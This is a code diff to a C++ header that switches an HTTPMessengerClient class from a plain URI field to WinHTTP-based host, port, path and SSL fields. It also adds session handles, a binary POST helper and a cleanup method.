@@ -3,15 +3,20 @@
 
 #include "messenger_client.h"
 
+#include <windows.h>
+#include <winhttp.h>
+
 #include <mutex>
 #include <queue>
 #include <string>
 #include <vector>
 
+#pragma comment(lib, "winhttp.lib")
+
 class HTTPMessengerClient : public MessengerClient {
 public:
     HTTPMessengerClient(const std::string& uri, const std::vector<uint8_t>& encryption_key);
-    ~HTTPMessengerClient() override = default;
+    ~HTTPMessengerClient() override;
 
     void connect() override;
     void send_downstream_message(const Message& message) override;
@@ -19,10 +24,19 @@ public:
 
 private:
     void poll_server();
+    std::vector<uint8_t> post_binary(const std::vector<uint8_t>& data);
+    void cleanup();
 
-    std::string uri_;
+    std::string host_;
+    INTERNET_PORT port_;
+    std::string path_;
+    bool use_ssl_;
+
     std::vector<uint8_t> encryption_key_;
     std::string messenger_id_;
+
+    HINTERNET h_session_ = nullptr;
+    HINTERNET h_connect_ = nullptr;
 
     std::queue<Message> downstream_messages_;
     std::mutex downstream_mutex_;
